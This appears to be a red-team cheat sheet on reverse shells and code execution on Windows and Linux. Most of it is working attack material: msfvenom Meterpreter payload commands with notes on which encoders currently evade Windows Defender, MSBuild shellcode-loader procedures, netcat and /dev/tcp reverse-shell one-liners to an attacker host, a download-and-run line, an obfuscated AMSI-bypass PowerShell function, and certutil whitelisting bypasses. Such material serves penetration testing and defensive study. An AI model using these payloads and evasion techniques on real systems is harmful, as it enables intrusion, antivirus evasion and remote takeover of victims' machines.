<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Reverse Shells

### Command Execution and Reverse Shells

* From a Windows Machine
	* PowerShell ([TTP](TTP/T1059_Command_and_Scripting_Interpreter/001_PowerShell/T1059.001.md))
	* Windows Command Shell ([TTP](TTP/T1059_Command_and_Scripting_Interpreter/003_Windows_Command_Shell/T1059.003.md))
* From a Linux Machine
	* Unix Shell ([TTP](TTP/T1059_Command_and_Scripting_Interpreter/004_Unix_Shell/T1059.004.md))
	* Python ([TTP](TTP/T1059_Command_and_Scripting_Interpreter/006_Python/T1059.006.md))

### References

* Reverse Shell Cheat Sheet -<br />[http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
* Pentest Monkey Site -<br />[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Example Reverse Shells

* Phishing
	* <details><summary>Excel (Click to expand)</summary><p>
		* [Example 1](Testaments_and_Books/Redvelations/Windows/Payloads/VBA1.vba)
			* Features
				* Execute upon macro enabling
			* Lines to Modify
				* Modify backwards URL to point to your infrastructure
	* <details><summary>Word (Click to expand)</summary><p>
		* [Example 1](Testaments_and_Books/Redvelations/Windows/Payloads/VBA2.vba)
			* Modify the infrastructure position to your infrastructure URL
* MSBuild
	* <details><summary>Initial Requirements (Click to expand)</summary><p>
		* .NET Framework installed on target
		* For this specific attack, MSBuild version v4.0.3019 (`C:\Windows\Microsoft.NET\Framework\v4.0.30319`)
		* Phishing Requirements
			* Ability to pull down an XML file
			* 2) Execution of a command (Macros?)
		* Webshell (IUSR, you need to execute with these options:

			set TEMP=C:\Users\Public\ && set TMP=C:\Users\Public\ && MSBuild.exe
	* <details><summary>SubTee's Function (The Original) (Click to expand)</summary><p>
		1. Generate shellcode for the XML file.
			* msfvenom option 1

					msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f csharp
				* Note: Windows Defender will catch this by default, without using an encoder. shikata_gai_nai use to work, but doesn't seem to bypass Defender. Other encoders might work.</b>
			* msfvenom option 2

					msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f csharp -e x86/fnstenv_mov -i 1
				* Currently working on Defender.
			* msfvenom option 3

					msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f csharp -e x86/shikata_gai_nai -i 50
				* Currently NOT working on Symantec
				* Currently not working on Defender.
		1. Insert shellcode into shell of XML file shell:
			* [MSBuild XML Shell SubTee](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_SubTee.xml)
		1. Execute

				C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shellcode.xml
			* We can rename shellcode.xml to a .txt file as well.
	* <details><summary>vector-sec Function (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://gist.github.com/vector-sec/1f543c30d0bbc691a6f50a1cc549cef1](https://gist.github.com/vector-sec/1f543c30d0bbc691a6f50a1cc549cef1)
		* <details><summary>Process (Click to expand)</summary><p>
			1. Use msfvenom to generate the shellcode

					msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=host.com -f raw -a x86 > payload.raw
					cat payload.raw | base64
			1. Insert into MSBuild Template
				* [XML Shell vector-sec](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_vector-sec.xml)
	* <details><summary>dxflatline's method (with GZip) (Click to expand)</summary><p>
		* References
			[https://gist.github.com/dxflatline/99de0da360a13c565a00a1b07b34f5d1#file-msbuild_sc_alloc-csproj](https://gist.github.com/dxflatline/99de0da360a13c565a00a1b07b34f5d1#file-msbuild_sc_alloc-csproj)
		* <details><summary>Process (Click to expand)</summary><p>
			1. Payload Generations
				* msfvenom option 1

						msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=54321 -f raw 2>/dev/null | gzip | base64 -w 0
					* Has been caught
				* msfvenom option 2

						msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=54321 --encoder x86/xor_dynamic -f raw 2>/dev/null | gzip | base64 -w 0
					* Currently bypasses Windows Defender
			1. Insert into xml Shell
				* [MSBuild XML Shell dxflatline](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_dxflatline.xml)
	* <details><summary>Joel and Kerry's Method (Gzip + XOR) (Click to expand)</summary><p>
		* [MSBuild XML Shell Joel & Kerry](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_Joel_and_Kerry.xml)
	* <details><summary>64-bit MSBuild + (64-bit Shellcode) (Click to expand)</summary><p>
		* Notes
			* The main difference between this and the standard 32-bit version (besides the shellcode) is the replacement of all instances of **UInt32** with **UInt64**
		* Template
			* [MSBuild XML Shell 64-bit](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_XML_Shell_64-bit.xml)
			* [MSBuild 64-bit C Code](Testaments_and_Books/Redvelations/Windows/Payloads/MSBuild_64-Bit.c)
	* <details><summary>Generate payload and format XOR key for C-sharp (Click to expand)</summary><p>
		* <details><summary>Options (Click to expand)</summary><p>
			* Create random key for XOR

					dd if=/dev/urandom bs=1 count=50 of=key
					50+0 records in
					50+0 records out
					50 bytes copied, 0.00020814 s, 240 kB/s
			* compile simple XOR C program

					gcc xor.c -o xor
			* generate payload
			
					$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.241.216.208 LPORT=443 -f raw | gzip  | ./xor key | base64 -w 0
					[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
					[-] No arch selected, selecting arch: x64 from the payload
					No encoder or badchars specified, outputting raw payload
					Payload size: 682 bytes
					qAQKcJyn67+Mx2RPTh5W7qPya/tOEoI3wdILri3YKXM75jyqHnKkRXshKo5J7Qu5S8tLqhdg9tfviFyx0TzC5r2hVzRL6aPDxsAAR2xeTRkyB+pWHeh89lZhaZFyGlNQavh7l8da2AJxQYxyPi2qt5a7SFPqRSpbQdAhrA7OiQebL+dTi94E84S3ot1Q6EiY2Psex4vHzILmbv9jwh6R/94RY0CO/oFNFcs/6SmTFPHs18RtzQezijBNIX3zH2ap0SV9/diTeNZ39tEjsUOe1RkpsGuxITsPk7EmNRozgbCXsU/FGK3RQPRiEwrXnBEbVTaG9H5sE7twoegsuP/Iu+1QzdD1xlFid+j5KsA6ayz8mgr92NezNtqGjH7YDAavB5ymQAzs0eYNUQbYTjmVlGaUWc0DFQGMaSnViOJqE2FRrRDYDnudX7rVu4IlAWfY/fKypr3x8pEuBG1ik1nMrD2ynv+pehEit1Lpzk9GfxQHreZ6QlJYJb1ROOQDkahMNr5lrHL2CgKnyAvDjq8cOnhWIdOVyd5/M/woVoKRR6EYeJCnumTsvzIkneV97n6snyoXgSn70PzGd9EuPZmjW9NFaV9jVbTtiUiKrQLZTUBHOWNd2Z7jtTrj5LrwcO3URQ7x0LXny7Hgoqg5JDoodeq7w7rR0sh+MY15DATxmPouMmYacK7NL1sxj09An8LlwnYKopGTq0Jq2lfp8vPLUhDUkahSJE+n7i4PqND9HC7pjCtOTZOBcvtJmWKlQO0gO/SJEbsiHRRRlxJwzZQetMkZ5Rn2NnpIdCbvpS+8YT6R+VxM0ca7nPJMUX2v
			* C-Sharp-friendly key format
				* Paste this into the "xor_key" variable in the MSBuild XML file

						python3 -c 'print(", ".join(["0x{:02x}".format(c) for c in open("key",mode="rb").read()]))'
						0x87, 0xf5, 0x39, 0x4f, 0x91, 0x79, 0x1b, 0x1c, 0xb4, 0xc8, 0x8e, 0x35, 0xb7, 0x82, 0xa5, 0xe6, 0x0b, 0x40, 0x3a, 0x84, 0x6b, 0xb1, 0xf9, 0xae, 0x90, 0x74, 0xe3, 0x4a, 0x3b, 0x4d, 0x82, 0x13, 0xc0, 0x05, 0x23, 0xac, 0x10, 0xf7, 0x72, 0x95, 0x29, 0x1a, 0x45, 0x09, 0x1e, 0xaa, 0x2e, 0xd8, 0x51, 0xe0
	* <details><summary>Using built in System.Build through .NET (Click to expand)</summary><p>
		* This technique uses the Microsoft built in call to the API System.Build, which functions as a proxy to running msbuild.exe without running MSBuild.exe. Some custom configurations is required.
		* References
				* [https://github.com/rvrsh3ll/MSBuildAPICaller](https://github.com/rvrsh3ll/MSBuildAPICaller)
				* [https://twitter.com/424f424f/status/1218970986793533440](https://twitter.com/424f424f/status/1218970986793533440)
	* <details><summary>Calling .NET API Functions from MSBuild (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://gist.github.com/bohops/726229552bb9fcbfae40ec8191534df1](https://gist.github.com/bohops/726229552bb9fcbfae40ec8191534df1)
		* By setting the `MSBUILDENABLEALLPROPERTYFUNCTIONS` environment variable, you can allow MSBuild access to all .NET API functions. This allows for execution of 32-bit shellcode from memory mapped files: 
		* Process
			1. Generate a payload (Must be 32-bit to work with MSBuild)

					 msfvenom -p windows/meterpreter/reverse_https lhost=<INFRASTRUCTURE> lport=443 PayloadUUIDTracking=true PayloadUUIDName=WinMetRevHttpsX86 -f raw -b "\x00" | base64 -w 0; echo
			1. Insert the base64-encoded payload between the `&lt;s&gt;&lt;/s&gt;` tags
			1. Invoke the payload

					set MSBUILDENABLEALLPROPERTYFUNCTIONS=1
					C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe C:\Users\Public\Downloads\project.xml
	* <details><summary>NEEDS RESEARCH (Click to expand)</summary><p>
		* <details><summary>Turn Any .NET Application into an LOL Bin (Click to expand)</summary><p>
			* Obfuscate payload (GZip and/or XOR) if AV starts detecting base64-encoded payloads. 
				* References
					* byt3bl33d3r -<br />[https://gist.github.com/byt3bl33d3r/376a4aa8624079d5747ddd16b55841db](https://gist.github.com/byt3bl33d3r/376a4aa8624079d5747ddd16b55841db)
					* bohops -<br />[https://gist.github.com/bohops/726229552bb9fcbfae40ec8191534df1](https://gist.github.com/bohops/726229552bb9fcbfae40ec8191534df1)
				* GZip would be ideal due to ease of generation, but is difficult to unpack since it changes the size of the payload upon decompression. Reading the new size from a MemoryStream using the limited capabilities available within MSBuild's Properties is not trivial.
				* To set the environmental variable from within VBA, use the following snippet.

						Dim objUserEnvVars As Object
						Set objUserEnvVars = CreateObject("WScript.Shell").Environment("User")
						objUserEnvVars.item("MSBUILDENABLEALLPROPERTYFUNCTIONS") = "1"
				* In order for this to work, you need to find a C# file (try to target a signed Microsoft File), to a directory and then output a file below with `BinaryName.exe.config`. Then when you execute `BinaryName.exe`, it should call the code below.
					* [XML](Testaments_and_Books/Redvelations/Windows/Payloads/config-file-lolbin.xml)
	* <details><summary>Potential Alternatives to MSBuild (Click to expand)</summary><p>
		* SAVE until MSBuild no longer viable.
			* [https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/](https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/)
* <details><summary>netcat (Click to expand)</summary><p>

			nc <attacker_ip> <port> -e /bin/bash
			mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
			/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
			mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
			telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
			wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
* <details><summary>Powershell (Click to expand)</summary><p>
	* <details><summary>AMSI Bypass (Oct 2018) (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
		* <details><summary>Process (Click to expand)</summary><p>
			1. Define function:

					function Bypass-AMSI
					{
						if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
							$e = [System.IO.MemoryStream]::new()
							([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String("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")), ([IO.Compression.CompressionMode]::Decompress))).CopyTo($e)
							[Reflection.Assembly]::Load($e.ToArray()) | Out-Null
						}
						[Bypass.AMSI]::Disable()
					}
			1. Execute
				* Option 1: Call Function **Bypass-AMSI**
				* Option 2: Use the one-liner.  (Add payload to end, encode, then call with "powershell -enc <encoded_payload>")

					[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(ONELINER_HERE))

					if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {$e = [System.IO.MemoryStream]::new();([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String("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")), ([IO.Compression.CompressionMode]::Decompress))).CopyTo($e);[Reflection.Assembly]::Load($e.ToArray()) | Out-Null};[Bypass.AMSI]::Disable()
			* [Source code](Testaments_and_Books/Redvelations/Windows/Payloads/PowerShell_AMSI_Bypass.cs)
* <details><summary>Powershell Download & Execute (Click to expand)</summary><p>
	* Executable:

			PowerShell (
			New-Object System.Net.WebClient).DownloadFile('http://192.168.5.109/file1.exe','file1.exe')(New-Object -com Shell.Application).ShellExecute('file1.exe');
	* Powershell script:
		
			Powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('<INFRASTRUCTURE>', 'c:\users\public\DHAMaint.ps1')"
* <details><summary>Powershell Meterpreter Callback One-liner (Click to expand)</summary><p>
	* A powershell one-liner to initate a meterpreter callback is very useful when you have execution but not a fully-interactive shell, and therefore must fit your entire command on one line.
	* The manual process for doing this requires running msfvenom on a kali/linux machine.
	* <details><summary>Process (Click to expand)</summary><p>
		1. Run the following msfvenom command with replacing the IP address, local port, and output filename variable. All of the switches are critical for making sure that the resulting payload is small enough to fit within a powershell encoded command, as windows places a hard limit on its size.

			msfvenom -p windows/meterpreter/reverse_https lhost=<ip address of listener> lport=<port of listener> -f psh-reflection -a x86 -s 0 > output.txt
		1. Take these results, move them back to a windows machine.
		1. In windows, you need to run the "Out-EncodedCommand.ps1" tool found as part of powersploit.
		1. Open a powershell prompt with execution policy in bypass mode:

				powershell -ExecutionPolicy bypass
		1. navigate to a directory with the Out-EncodedCommand.ps1 script, and your code taken from kali both present.
		1. Run the below to loads the module into powershell.

				Import-Module ./Out-EncodedCommand.ps1
		1. Finally:

				Out-EncodedCommand -Path ./output.txt -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput > encodedcommand.txt
		1. The contents of encodedcommand.txt (or whatever you name it) are to be used at a regular windows cmd shell and should initiate a windows callback.
* <details><summary>wmiexec (Click to expand)</summary><p>
	* <details><summary>Windows (Click to expand)</summary><p>
		* Non-domain-joined
			* Requirements
				* User is part of the `Remote Management Users` group with the following registry change:

						HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
					* DWORD, `LocalAccountTokenFilterPolicy`, value of 1
* <details><summary>Whitelisting Bypass (Click to expand)</summary><p>
	* When encountering an asset/enterprise that uses whitelisting or uses products that block/alert on PowerShell, you can use microsoft's built in tools to get execution.
	* <details><summary>For File Download (Click to expand)</summary><p>
		* certutil.exe

				certutil -urlcache -split -f http://<INFRASTRUCTURE>/msbuild.xml msbuild.xml
			* Currently caught by Defender
		* Pull down a base64-encoded payload to bypass network detections

			certutil -urlcache -split -f http://<INFRASTRUCTURE>/blogpost_b64.xls blogpost_b64.xls
			certutil -decode blogpost_b64.xls blogpost.xls
		* Unicode bypass example

				certutil.exe ûurlcache ûsplit ûf http://7-zip.org/a/7z1604-x64.exe 7zip.exe
			* unicode U character: `ALT 150`
	* For Code Execution
		* Thanks to its built-in XSL-parsing capability, wmic.exe can be made to execute arbitrary JScript code (which can in turn execute shellcode).
		* This requires that .Net Framework 3.5 be installed.
* <details><summary>Using XSL + CactusTorch (Click to expand)</summary><p>
	* <details><summary>Process (Click to expand)</summary><p>
		1. Download the .js CactusTorch .js payload - <br />[https://github.com/mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
			* Local Copy [CactusTorch.js Payload](Testaments_and_Books/Redvelations/Windows/Payloads/CactusTorch.js)
		1. Run CactusTorch
			* Example Output (Help Output)

					  .
					  (	(	   (	*   )	  )\ )  *   ) ( /(  )\ )  (   ( /(
					  )\   )\	  )\ ` )  /(   ( (()/(` )  /( )\())(()/(  )\  )\())
					 (((_|(((_)(  (((_) ( )(_))  )\ /(_))( )(_)|(_)\  /(_)|((_)((_)\
					 )\___)\ _ )\ )\___(_(_())_ ((_|_)) (_(_())  ((_)(_)) )\___ _((_)
					((/ __(_)_\(_|(/ __|_   _| | | / __||_   _| / _ \| _ ((/ __| || |
					 | (__ / _ \  | (__  | | | |_| \__ \  | |  | (_) |   /| (__| __ |
					  \___/_/ \_\  \___| |_|  \___/|___/  |_|   \___/|_|_\ \___|_||_|
																					
				   Author: Vincent Yiu (@vysecurity)
				   Credits:
					 - @cn33liz: Inspiration with StarFighter
					 - @tiraniddo: James Forshaw for DotNet2JScript
					 - @armitagehacker: Raphael Mudge for idea of selecting 32 bit version on 64 bit architecture machines for injection into
				
